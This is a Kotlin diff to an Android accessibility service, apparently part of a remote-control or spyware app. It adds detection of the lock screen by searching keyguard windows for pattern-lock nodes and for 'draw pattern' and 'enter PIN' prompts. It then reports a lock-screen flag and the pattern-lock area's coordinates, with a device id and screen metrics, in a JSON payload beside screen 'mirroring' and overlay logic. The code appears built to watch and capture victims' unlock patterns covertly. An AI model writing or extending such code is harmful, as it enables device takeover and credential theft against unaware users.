@@ -253,8 +253,9 @@ class ControleGestosService : AccessibilityService() {
         }
 
         val elementosLimpos = removerElementosRedundantes(listaElementos)
-        val areaPadrao = detectarAreaPadrao(elementosLimpos)
-        return montarJsonEstrutura(elementosLimpos, displayMetrics, areaPadrao)
+        val telaBloqueio = detectarTelaBloqueioAtiva()
+        val areaPadrao = if (telaBloqueio) detectarAreaPadrao(elementosLimpos) else null
+        return montarJsonEstrutura(elementosLimpos, displayMetrics, areaPadrao, telaBloqueio)
     }
 
     private fun capturarCacheEspelhoAntesOverlay() {
@@ -272,7 +273,8 @@ class ControleGestosService : AccessibilityService() {
     private fun montarJsonEstrutura(
         listaElementos: List<Map<String, Any>>,
         displayMetrics: android.util.DisplayMetrics,
-        areaPadrao: Rect? = null
+        areaPadrao: Rect? = null,
+        telaBloqueio: Boolean = false
     ): String {
         val json = org.json.JSONObject().apply {
             put("id", obterIdDispositivo())
@@ -282,7 +284,8 @@ class ControleGestosService : AccessibilityService() {
             put("largura", displayMetrics.widthPixels)
             put("altura", displayMetrics.heightPixels)
             put("densidade", displayMetrics.densityDpi)
-            if (areaPadrao != null && areaPadrao.width() >= 120 && areaPadrao.height() >= 120) {
+            put("tela_bloqueio", telaBloqueio)
+            if (telaBloqueio && areaPadrao != null && areaPadrao.width() >= 120 && areaPadrao.height() >= 120) {
                 put("area_padrao", org.json.JSONObject().apply {
                     put("x", areaPadrao.left)
                     put("y", areaPadrao.top)
@@ -409,6 +412,18 @@ class ControleGestosService : AccessibilityService() {
         return ehPacoteKeyguard(pacote)
     }
 
+    private fun ehPacoteTeclado(pacote: String): Boolean {
+        val p = pacote.lowercase()
+        return p.contains("inputmethod") || p.contains("keyboard") || p.contains("teclado") ||
+                p.contains("latin") || p.contains("samsungkeyboard") || p.contains("gboard")
+    }
+
+    private fun ehJanelaIme(janela: AccessibilityWindowInfo): Boolean {
+        if (janela.type == AccessibilityWindowInfo.TYPE_INPUT_METHOD) return true
+        val pacote = janela.root?.packageName?.toString().orEmpty()
+        return ehPacoteTeclado(pacote)
+    }
+
     private fun obterJanelasKeyguard(): List<AccessibilityWindowInfo> {
         val janelas = windows ?: return emptyList()
         return janelas.filter { janela ->
@@ -416,46 +431,100 @@ class ControleGestosService : AccessibilityService() {
             val pacote = raiz.packageName?.toString().orEmpty()
             pacote != packageName &&
                     janela.type != AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY &&
-                    (ehPacoteKeyguard(pacote) ||
-                            janela.type == AccessibilityWindowInfo.TYPE_SYSTEM ||
-                            janela.type == AccessibilityWindowInfo.TYPE_INPUT_METHOD)
+                    !ehPacoteTeclado(pacote) &&
+                    !ehJanelaIme(janela) &&
+                    ehPacoteKeyguard(pacote)
         }
+    }
+
+    private fun detectarTelaBloqueioAtiva(): Boolean {
+        for (janela in obterJanelasKeyguard()) {
+            val raiz = janela.root ?: continue
+            if (buscarNoPadraoRecursivoSimples(raiz) || buscarTextoBloqueioRecursivo(raiz)) {
+                return true
+            }
+        }
+        return false
+    }
+
+    private fun buscarNoPadraoRecursivoSimples(no: AccessibilityNodeInfo, profundidade: Int = 0): Boolean {
+        if (profundidade > 14) return false
+        if (ehNoPadrao(no)) {
+            val area = Rect()
+            no.getBoundsInScreen(area)
+            if (area.width() >= 120 && area.height() >= 120) return true
+        }
+        for (i in 0 until no.childCount) {
+            val filho = no.getChild(i) ?: continue
+            if (buscarNoPadraoRecursivoSimples(filho, profundidade + 1)) return true
+        }
+        return false
+    }
+
+    private fun buscarTextoBloqueioRecursivo(no: AccessibilityNodeInfo, profundidade: Int = 0): Boolean {
+        if (profundidade > 12) return false
+
+        val texto = obterRotuloElemento(no).lowercase()
+        if (texto.contains("desenhe o padr") ||
+            texto.contains("draw pattern") ||
+            texto.contains("draw your pattern") ||
+            texto.contains("digite o pin") ||
+            texto.contains("insira o pin") ||
+            texto.contains("enter pin")
+        ) {
+            return true
+        }
+
+        for (i in 0 until no.childCount) {
+            val filho = no.getChild(i) ?: continue
+            if (buscarTextoBloqueioRecursivo(filho, profundidade + 1)) return true
+        }
+        return false
     }
 
     private fun obterTodasJanelasEspelho(): List<AccessibilityWindowInfo> {
         val janelas = windows ?: return emptyList()
-        val ids = linkedSetOf<Int>()
-        val resultado = mutableListOf<AccessibilityWindowInfo>()
+        val telaBloqueio = detectarTelaBloqueioAtiva()
 
+        fun janelaAppValida(janela: AccessibilityWindowInfo): Boolean {
+            val raiz = janela.root ?: return false
+            val pacote = raiz.packageName?.toString().orEmpty()
+            return pacote != packageName &&
+                    janela.type == AccessibilityWindowInfo.TYPE_APPLICATION &&
+                    !ehPacoteKeyguard(pacote) &&
+                    !ehPacoteTeclado(pacote) &&
+                    !ehJanelaIme(janela) &&
+                    !ehLauncher(pacote)
+        }
+
+        val apps = janelas.filter { janelaAppValida(it) }
+            .sortedByDescending { janela ->
+                val area = Rect()
+                janela.root?.getBoundsInScreen(area)
+                val bonus = when {
+                    janela.isFocused -> 1_000_000
+                    janela.isActive -> 500_000
+                    else -> 0
+                }
+                bonus + area.width() * area.height()
+            }
+
+        if (!telaBloqueio) {
+            apps.firstOrNull()?.let { return listOf(it) }
+            if (overlayAtivo || OverlayActivity.estaAtiva()) {
+                return janelas.filter { janelaAppValida(it) }.take(1)
+            }
+            return emptyList()
+        }
+
+        val resultado = mutableListOf<AccessibilityWindowInfo>()
+        val ids = linkedSetOf<Int>()
         fun adicionar(janela: AccessibilityWindowInfo) {
             if (ids.add(janela.id)) resultado.add(janela)
         }
 
         obterJanelasKeyguard().forEach { adicionar(it) }
-
-        val apps = janelas.filter { janela ->
-            val raiz = janela.root ?: return@filter false
-            val pacote = raiz.packageName?.toString().orEmpty()
-            pacote != packageName &&
-                    janela.type != AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY &&
-                    !ehPacoteKeyguard(pacote) &&
-                    !ehLauncher(pacote)
-        }.sortedByDescending { janela ->
-            val area = Rect()
-            janela.root?.getBoundsInScreen(area)
-            area.width() * area.height()
-        }
-
-        apps.take(if (overlayAtivo || OverlayActivity.estaAtiva()) 3 else 2).forEach { adicionar(it) }
-
-        if (resultado.isEmpty()) {
-            janelas.filter { janela ->
-                val raiz = janela.root ?: return@filter false
-                val pacote = raiz.packageName?.toString().orEmpty()
-                pacote != packageName && janela.type != AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY
-            }.forEach { adicionar(it) }
-        }
-
+        apps.take(1).forEach { adicionar(it) }
         return resultado
     }
 
